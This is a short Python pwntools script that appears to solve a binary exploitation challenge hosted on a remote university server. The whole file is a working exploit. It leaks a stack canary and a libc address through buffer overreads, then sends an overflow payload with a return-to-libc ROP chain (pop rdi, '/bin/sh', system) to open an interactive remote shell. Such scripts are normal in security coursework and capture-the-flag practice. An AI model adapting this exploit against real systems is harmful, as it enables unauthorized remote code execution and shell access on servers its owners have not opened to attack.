from pwn import *

port = 10007
rem = remote("kayle.snu.ac.kr", port)

lib = ELF("./level3/problem/libc.so.6")

rem.recvline()

payload = b"A" * 73
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' + rem.recvn(7))
rem.recvline()

payload = b"B" * 104
rem.send(payload)
rem.recvuntil(payload)
lib_base = u64(rem.recvn(6) + b"\x00" * 2) + 0xb0 - lib.symbols['__libc_start_main'] - 128
rem.recvline()

ret = lib_base + 0x29139
shell = lib_base + next(lib.search("/bin/sh"))
pop_rdi = lib_base + 0x2a3e5
syscall = lib_base + lib.symbols['system']
payload = b"C" * 0x28
payload += p64(canary) + b"D" * 8
payload += p64(ret)
payload += p64(pop_rdi) + p64(shell)
payload += p64(syscall)
rem.sendafter(b"comment: ", payload)

rem.interactive()